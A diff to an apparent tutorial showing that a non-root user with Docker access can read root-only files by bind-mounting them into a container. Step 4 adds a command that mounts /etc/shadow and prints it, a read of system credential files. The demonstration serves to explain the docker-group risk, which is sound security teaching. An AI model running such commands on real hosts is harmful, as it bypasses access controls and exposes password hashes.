@@ -9,34 +9,38 @@
 1. Create a new file as the `root` user.
 
     ```bash
-    su - # login as root
-    echo "supersecret" > secret.txt
+    sudo -i # login as root
+    echo "supersecret" > /tmp/secret.txt
+    chmod 600 /tmp/secret.txt
     ```
 
 2. List files and read `secret.txt` content as root.
 
     ```bash
     # list files in current directory
-    ls -lhr
+    ls -lhr /tmp/secret.txt
     total 8.0K
-    -rw-r--r-- 1 root   root     12 Jan 17 23:14 secret.txt
+    -rw------- 1 root   root     12 Jan 17 23:14 secret.txt
     # show content of file
-    cat secret.txt 
+    cat /tmp/secret.txt
     supersecret
+    exit # logout from root
     ```
 
 3. Using a regular user (non-root) account try to display the content of the `secret.txt` file.
 
     ```bash
-    cat secret.txt
+    cat /tmp/secret.txt
     cat: secret.txt: Permission denied
     ```
 
 4. Using a regular user (non-root) account run a docker container and mount the `secret.txt` file to read the content.
 
     ```bash
-    docker run -v "$(pwd)/secret.txt:/tmp/secret.txt" -it alpine sh -c "cat /tmp/secret.txt"
+    docker run -v "/tmp/secret.txt:/tmp/secret.txt" -it alpine sh -c "cat /tmp/secret.txt"
     supersecret
+    # you can do the same with the /etc/shadow file
+    docker run -v "/etc/shadow:/tmp/shadow" -it alpine sh -c "cat /tmp/shadow"
     ```
 
 5. Inspect who's running the docker container using the `ps` command.
